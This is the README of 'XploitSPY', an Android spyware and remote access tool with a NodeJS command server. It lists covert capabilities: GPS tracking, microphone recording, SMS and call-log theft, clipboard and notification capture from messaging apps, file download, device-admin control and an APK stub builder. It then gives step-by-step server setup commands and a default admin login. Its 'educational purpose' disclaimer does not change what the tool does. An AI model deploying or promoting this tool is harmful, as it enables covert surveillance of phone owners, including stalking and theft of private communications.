# android-SPY

A cloud based Android Monitoring Tool, powered by NodeJS

Features
GPS Logging
Microphone Recording
View Contacts
SMS Logs
Send SMS
Call Logs
View Installed Apps
View Stub Permissions
Live Clipboard Logging
Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
View WiFi Networks (logs previously seen)
File Explorer & Downloader
Command Queuing
Device Admin
Built In APK Builder
Prerequisites
Java Runtime Environment 11 or above
NodeJs
A Server with Static IP Address
Installation
Install JRE 11

Debian, Ubuntu, Etc
sudo apt-get install openjdk-11-jre
Install NodeJS Instructions Here (If you can't figure this out, you shouldn't really be using this)

install PM2

sudo npm install pm2 -g
Clone the repo

git clone https://github.com/XploitWizer/XploitSPY.git
Go to server directory

cd XploitSPY/server/
In the server directory, run these commands

npm install <- install dependencies
pm2 start index.js <-- start the script
pm2 startup <- to run XploitSPY on startup
Find your public IP curl ifconfig.me

In your browser navigate to your Server Static IP Address Ex.: http://192.168.55.203

Login details

Username : admin
Password : password
It's recommended to run X-SPY behind a reverse proxy such as NGINX

Buy us a Coffee
Bitcoin : 3HwzRLbZxFVxyZzLoEHFnoB5RVKfzwxDbf

Paypal : https://paypal.me/raomk

Disclaimer
XploitWizer Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.
XploitSPY is built for Educational Purpose. Use at your own Risk.


Made with ❤️ By EosAP

Credits
Credits to D3VL for the original code base this repository is based on at L3MON
